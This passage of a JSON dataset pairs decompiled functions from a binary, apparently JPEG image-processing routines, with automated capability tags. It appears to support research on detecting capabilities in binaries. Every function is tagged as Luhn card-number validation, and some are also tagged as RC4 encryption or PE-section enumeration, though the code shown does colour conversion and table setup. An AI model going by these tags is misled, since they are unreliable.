            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00477728(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uchar auStack1040 [1024];\n    \n    puStack1048 = &stack0xfffffbf0;\n    uStack1052 = 0x100;\n    uStack1056 = 0;\n    uStack1064 = 0x477746;\n    uStack1060 = param_2;\n    iVar3 = sub.gdi32.dll_GetPaletteEntries();\n    if (iVar3 != 0) {\n        uStack1064 = 3;\n        uVar4 = (**(*(in_EAX + 4) + 8))();\n        *(in_EAX + 0x88) = uVar4;\n        *(in_EAX + 0x84) = iVar3;\n        if (-1 < iVar3 + -1) {\n            iVar5 = 0;\n            puVar2 = &stack0xfffffbd8;\n            do {\n                piVar1 = *(in_EAX + 0x88);\n                *(piVar1[2] + iVar5) = puVar2[4];\n                *(piVar1[1] + iVar5) = puVar2[5];\n                *(*piVar1 + iVar5) = puVar2[6];\n                iVar5 = iVar5 + 1;\n                iVar3 = iVar3 + -1;\n                puVar2 = puVar2 + 4;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "00478080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478080(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    in_EAX[1] = 0;\n    if (param_2 != 0x3e) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xc;\n        *(iVar2 + 0x18) = 0x3e;\n        *(iVar2 + 0x1c) = param_2;\n        (***in_EAX)();\n    }\n    if (param_1 != 0x1d0) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x15;\n        *(iVar2 + 0x18) = 0x1d0;\n        *(iVar2 + 0x1c) = param_1;\n        (***in_EAX)();\n    }\n    iVar2 = *in_EAX;\n    iVar1 = in_EAX[3];\n    fcn.00476ba0(in_EAX, 0, 0x1d0);\n    *in_EAX = iVar2;\n    in_EAX[3] = iVar1;\n    in_EAX[4] = 1;\n    fcn.004790a4();\n    in_EAX[2] = 0;\n    piVar3 = in_EAX + 0x29;\n    in_EAX[6] = 0;\n    iVar2 = 0;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar3 = in_EAX + 0x2d;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3[4] = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    in_EAX[0x4c] = 0;\n    fcn.00483650();\n    fcn.004796f8();\n    in_EAX[5] = 200;\n    return;\n}\n",
        "token_count": 523
    },
    "0047875c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047875c(uint32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    var_14h = 0x3b9ac9f4 / in_ECX;\n    if (var_14h == 0) {\n        *(*in_EAX + 0x14) = 0x46;\n        (***in_EAX)();\n    }\n    if (arg_8h <= var_14h) {\n        var_14h = arg_8h;\n    }\n    *(iVar1 + 0x50) = var_14h;\n    iVar1 = fcn.0047858c();\n    var_18h = 0;\n    if (arg_8h != 0) {\n        do {\n            if (arg_8h - var_18h <= var_14h) {\n                var_14h = arg_8h - var_18h;\n            }\n            iVar2 = fcn.004786bc();\n            piVar3 = iVar1 + var_18h * 4;\n            for (uVar4 = var_14h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *piVar3 = iVar2;\n                var_18h = var_18h + 1;\n                piVar3 = piVar3 + 1;\n                iVar2 = iVar2 + in_ECX;\n            }\n        } while (var_18h < arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 428
    },
    "00479e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00479e80(void)\n\n{\n    int32_t in_EAX;\n    int32_t arg_8h;\n    int32_t iVar1;\n    uchar *puVar2;\n    \n    arg_8h = (***(in_EAX + 4))();\n    puVar2 = arg_8h + 0x100;\n    *(in_EAX + 0x144) = puVar2;\n    fcn.00476ba0(arg_8h, 0, 0x100);\n    iVar1 = 0;\n    do {\n        *puVar2 = iVar1;\n        iVar1 = iVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (iVar1 < 0x100);\n    iVar1 = 0x80;\n    puVar2 = arg_8h + 0x200;\n    do {\n        *puVar2 = 0xff;\n        iVar1 = iVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (iVar1 < 0x200);\n    fcn.00476ba0(arg_8h + 0x380, 0, 0x180);\n    fcn.00476bb4(arg_8h + 0x500, *(in_EAX + 0x144), 0x80);\n    return;\n}\n",
        "token_count": 299
    },
    "0047aff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0047aff8(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1bc) = puVar1;\n    *puVar1 = 0x47a344;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xb;\n    do {\n        iVar2 = iVar2 + 1;\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0xa0) = puVar1;\n    for (iVar2 = 0; iVar2 < *(in_EAX + 0x24); iVar2 = iVar2 + 1) {\n        iVar3 = 0;\n        do {\n            *puVar1 = 0xffffffff;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x40);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "0047bbb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047bbb8(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1bc) = puVar1;\n    *puVar1 = 0x47b06c;\n    puVar1[1] = 0x47b754;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xe;\n    do {\n        *puVar1 = 0;\n        puVar1[-4] = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 175
    },
    "0047bbf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.0047bbf8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x10) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x14) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x18) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x1c) = uVar2;\n    iVar3 = 0;\n    iVar5 = -0x80;\n    do {\n        *(*(iVar1 + 0x10) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x14) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x18) + iVar3 * 4) = iVar5 * -0xb6d2;\n        iVar4 = iVar5 * -0x581a;\n        iVar5 = iVar5 + 1;\n        *(*(iVar1 + 0x1c) + iVar3 * 4) = iVar4 + 0x8000;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 401
    },
    "0047bd7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047bd7c(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    (**(*(in_EAX + 0x1c4) + 0xc))(*arg_ch * 4 + arg_10h);\n    *arg_ch = *arg_ch + 1;\n    *in_ECX = *in_ECX + 1;\n    return;\n}\n",
        "token_count": 120
    },
    "0047c1e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.0047c1e4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar1 = *(in_EAX + 0x1c8);\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 8) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0xc) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x10) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x14) = uVar2;\n    iVar3 = 0;\n    iVar5 = -0x80;\n    do {\n        *(*(iVar1 + 8) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0xc) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x10) + iVar3 * 4) = iVar5 * -0xb6d2;\n        iVar4 = iVar5 * -0x581a;\n        iVar5 = iVar5 + 1;\n        *(*(iVar1 + 0x14) + iVar3 * 4) = iVar4 + 0x8000;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 394
    },
    "0047c29c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c29c(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    uchar *puVar9;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c8);\n    uVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 8);\n    iVar7 = *(iVar3 + 0xc);\n    iVar8 = *(iVar3 + 0x10);\n    iVar3 = *(iVar3 + 0x14);\n    var_8h = in_ECX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_2ch = *(*in_EDX + var_8h * 4);\n        var_30h = *(in_EDX[1] + var_8h * 4);\n        var_34h = *(in_EDX[2] + var_8h * 4);\n        var_8h = var_8h + 1;\n        puVar9 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_14h = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar10 = *var_2ch;\n                uVar1 = *var_30h;\n                uVar2 = *var_34h;\n                puVar9[2] = *(iVar5 + uVar10 + *(iVar6 + uVar2 * 4));\n                puVar9[1] = *(iVar5 + uVar10 + (*(iVar3 + uVar1 * 4) + *(iVar8 + uVar2 * 4) >> 0x10));\n                *puVar9 = *(iVar5 + uVar10 + *(iVar7 + uVar1 * 4));\n                puVar9 = puVar9 + 3;\n                var_14h = var_14h + 1;\n                var_34h = var_34h + 1;\n                var_30h = var_30h + 1;\n                var_2ch = var_2ch + 1;\n            } while (var_14h < uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "0047c3a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c3a4(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x24);\n    iVar2 = *(in_EAX + 0x70);\n    while (arg_8h = arg_8h + -1,  -1 < arg_8h) {\n        var_ch = 0;\n        var_10h = in_EDX;\n        if (0 < iVar1) {\n            do {\n                puVar4 = *arg_ch + var_ch;\n                puVar3 = *(*var_10h + in_ECX * 4);\n                for (iVar5 = iVar2; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + iVar1;\n                }\n                var_ch = var_ch + 1;\n                var_10h = var_10h + 1;\n            } while (var_ch < iVar1);\n        }\n        in_ECX = in_ECX + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "0047c434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c434(int32_t arg_8h, uint *arg_ch)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    uVar2 = *(in_EAX + 0x70);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        uVar5 = 0;\n        puVar4 = *(*in_EDX + in_ECX * 4);\n        in_ECX = in_ECX + 1;\n        puVar3 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (uVar2 != 0) {\n            do {\n                uVar1 = *puVar4;\n                *puVar3 = uVar1;\n                puVar3[1] = uVar1;\n                puVar3[2] = uVar1;\n                puVar3 = puVar3 + 3;\n                uVar5 = uVar5 + 1;\n                puVar4 = puVar4 + 1;\n            } while (uVar5 < uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "0047c47c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047c47c(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    uchar *puVar9;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    uchar *var_3ch;\n    uint8_t *var_38h;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c8);\n    uVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 8);\n    iVar7 = *(iVar3 + 0xc);\n    iVar8 = *(iVar3 + 0x10);\n    iVar3 = *(iVar3 + 0x14);\n    var_8h = in_ECX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_30h = *(*in_EDX + var_8h * 4);\n        var_34h = *(in_EDX[1] + var_8h * 4);\n        var_38h = *(in_EDX[2] + var_8h * 4);\n        var_3ch = *(in_EDX[3] + var_8h * 4);\n        var_8h = var_8h + 1;\n        puVar9 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_18h = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar10 = *var_30h;\n                uVar1 = *var_34h;\n                uVar2 = *var_38h;\n                *puVar9 = *(iVar5 + (0xff - (*(iVar6 + uVar2 * 4) + uVar10)));\n                puVar9[1] = *(iVar5 + (0xff - ((*(iVar3 + uVar1 * 4) + *(iVar8 + uVar2 * 4) >> 0x10) + uVar10)));\n                puVar9[2] = *(iVar5 + (0xff - (uVar10 + *(iVar7 + uVar1 * 4))));\n                puVar9[3] = *var_3ch;\n                puVar9 = puVar9 + 4;\n                var_18h = var_18h + 1;\n                var_3ch = var_3ch + 1;\n                var_38h = var_38h + 1;\n                var_34h = var_34h + 1;\n                var_30h = var_30h + 1;\n            } while (var_18h < uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 784
    },
    "0047cd98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047cd98(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    char **in_ECX;\n    char *pcVar10;\n    uint8_t **in_EDX;\n    int32_t iVar11;\n    char **var_1ch;\n    uint8_t **var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *piVar2;\n    iVar4 = piVar2[1];\n    iVar5 = piVar2[2];\n    iVar6 = *(in_EAX + 0x70);\n    var_10h = 0;\n    var_1ch = in_ECX;\n    var_18h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar9 = *var_18h;\n            pcVar10 = *var_1ch;\n            for (iVar11 = iVar6; iVar11 != 0; iVar11 = iVar11 + -1) {\n                uVar1 = *puVar9;\n                puVar7 = puVar9 + 1;\n                puVar8 = puVar9 + 2;\n                puVar9 = puVar9 + 3;\n                *pcVar10 = *(iVar3 + uVar1) + *(iVar4 + *puVar7) + *(iVar5 + *puVar8);\n                pcVar10 = pcVar10 + 1;\n            }\n            var_10h = var_10h + 1;\n            var_1ch = var_1ch + 1;\n            var_18h = var_18h + 1;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 496
    },
    "0047ce34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047ce34(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    uint32_t uVar8;\n    char **in_ECX;\n    char *pcVar9;\n    int32_t *in_EDX;\n    uint8_t *puVar10;\n    int32_t iVar11;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    char **var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *(in_EAX + 0x1cc);\n    iVar3 = *(in_EAX + 0x78);\n    iVar4 = *(in_EAX + 0x70);\n    var_1ch = 0;\n    var_34h = in_EDX;\n    var_24h = in_ECX;\n    if (0 < arg_8h) {\n        do {\n            fcn.00483830();\n            iVar5 = *(iVar2 + 0x30);\n            var_18h = 0;\n            var_30h = iVar2 + 0x34;\n            if (0 < iVar3) {\n                do {\n                    pcVar9 = *var_24h;\n                    puVar10 = *var_34h + var_18h;\n                    iVar6 = *(*(iVar2 + 0x18) + var_18h * 4);\n                    iVar7 = *var_30h;\n                    uVar8 = 0;\n                    for (iVar11 = iVar4; iVar11 != 0; iVar11 = iVar11 + -1) {\n                        iVar1 = uVar8 * 4;\n                        uVar8 = uVar8 + 1 & 0xf;\n                        *pcVar9 = *pcVar9 + *(iVar6 + *puVar10 + *(iVar7 + iVar5 * 0x40 + iVar1));\n                        pcVar9 = pcVar9 + 1;\n                        puVar10 = puVar10 + iVar3;\n                    }\n                    var_18h = var_18h + 1;\n                    var_30h = var_30h + 1;\n                } while (var_18h < iVar3);\n            }\n            *(iVar2 + 0x30) = iVar5 + 1U & 0xf;\n            var_1ch = var_1ch + 1;\n            var_34h = var_34h + 1;\n            var_24h = var_24h + 1;\n        } while (var_1ch < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 674
    },
    "0047d214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0047d214(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    iVar2 = *(in_EAX + 0x70) * 2 + 4;\n    puVar3 = *(in_EAX + 0x1cc) + 0x44;\n    for (iVar4 = 0; iVar4 < *(in_EAX + 0x78); iVar4 = iVar4 + 1) {\n        uVar1 = (**(*(in_EAX + 4) + 4))(iVar2);\n        *puVar3 = uVar1;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "0047d3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047d3d4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint8_t **in_EDX;\n    int16_t *piVar5;\n    uint8_t **var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar2 = *(in_EAX + 0x70);\n    var_4h = 0;\n    var_ch = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar3 = *var_ch;\n            for (iVar4 = iVar2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                piVar5 = *(iVar1 + (*puVar3 >> 3) * 4) + (puVar3[1] >> 2) * 0x40 + (puVar3[2] >> 3) * 2;\n                *piVar5 = *piVar5 + 1;\n                if (*piVar5 == 0) {\n                    *piVar5 = *piVar5 + -1;\n                }\n                puVar3 = puVar3 + 3;\n            }\n            var_4h = var_4h + 1;\n            var_ch = var_ch + 1;\n        } while (var_4h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 357
    },
    "0047d484": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047d484(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = 0;\n    iVar3 = 0;\n    iVar1 = 0;\n    if (0 < param_2) {\n        do {\n            if (iVar2 < *(in_EAX + 0x18)) {\n                iVar2 = *(in_EAX + 0x18);\n                iVar3 = in_EAX;\n            }\n            iVar1 = iVar1 + 1;\n            in_EAX = in_EAX + 0x20;\n        } while (iVar1 < param_2);\n    }\n    return iVar3;\n}\n",
        "token_count": 174
    },
    "0047db74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0047db74(uchar *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t in_EDX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_43ch;\n    int32_t *var_3ch;\n    uint8_t *var_38h;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *(in_EAX + 0x84);\n    var_10h = in_EDX + 0x18;\n    var_1ch = in_EDX + in_EDX + 0x18 >> 1;\n    var_14h = in_ECX + 0x1c;\n    var_20h = in_ECX + in_ECX + 0x1c >> 1;\n    var_18h = arg_ch + 0x18;\n    var_24h = arg_ch + arg_ch + 0x18 >> 1;\n    var_2ch = 0x7fffffff;\n    var_28h = 0;\n    var_3ch = &var_43ch;\n    var_38h = *(*(in_EAX + 0x88) + 8);\n    var_34h = *(*(in_EAX + 0x88) + 4);\n    var_30h = **(in_EAX + 0x88);\n    var_8h = in_ECX;\n    var_4h = in_EDX;\n    if (0 < *(in_EAX + 0x84)) {\n        do {\n            uVar6 = *var_30h;\n            if (uVar6 < var_4h) {\n                iVar5 = (uVar6 - var_4h) * (uVar6 - var_4h);\n                iVar4 = (uVar6 - var_10h) * (uVar6 - var_10h);\n            }\n            else if (var_10h < uVar6) {\n                iVar5 = (uVar6 - var_10h) * (uVar6 - var_10h);\n                iVar4 = (uVar6 - var_4h) * (uVar6 - var_4h);\n            }\n            else {\n                iVar5 = 0;\n                if (var_1ch < uVar6) {\n                    iVar4 = (uVar6 - var_4h) * (uVar6 - var_4h);\n                }\n                else {\n                    iVar4 = (uVar6 - var_10h) * (uVar6 - var_10h);\n                }\n            }\n            uVar6 = *var_34h;\n            if (uVar6 < var_8h) {\n                iVar1 = (uVar6 - var_8h) * 3;\n                iVar2 = (uVar6 - var_14h) * 3;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar4 = iVar4 + iVar2 * iVar2;\n            }\n            else if (var_14h < uVar6) {\n                iVar1 = (uVar6 - var_14h) * 3;\n                iVar2 = (uVar6 - var_8h) * 3;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar4 = iVar4 + iVar2 * iVar2;\n            }\n            else if (var_20h < uVar6) {\n                iVar1 = (uVar6 - var_8h) * 3;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else {\n                iVar1 = (uVar6 - var_14h) * 3;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            uVar6 = *var_38h;\n            if (uVar6 < arg_ch) {\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else if (var_18h < uVar6) {\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar5 = iVar5 + iVar1 * iVar1;\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else if (var_24h < uVar6) {\n                iVar1 = (uVar6 - arg_ch) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            else {\n                iVar1 = (uVar6 - var_18h) * 2;\n                iVar4 = iVar4 + iVar1 * iVar1;\n            }\n            *var_3ch = iVar5;\n            if (iVar4 < var_2ch) {\n                var_2ch = iVar4;\n            }\n            var_28h = var_28h + 1;\n            var_3ch = var_3ch + 1;\n            var_38h = var_38h + 1;\n            var_34h = var_34h + 1;\n            var_30h = var_30h + 1;\n        } while (var_28h < var_ch);\n    }\n    iVar5 = 0;\n    var_28h = 0;\n    piVar3 = &var_43ch;\n    if (0 < var_ch) {\n        do {\n            if (*piVar3 <= var_2ch) {\n                iVar5 = iVar5 + 1;\n                *arg_8h = var_28h;\n                arg_8h = arg_8h + 1;\n            }\n            var_28h = var_28h + 1;\n            piVar3 = piVar3 + 1;\n        } while (var_28h < var_ch);\n    }\n    return iVar5;\n}\n",
        "token_count": 1474
    },
    "0047e6d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
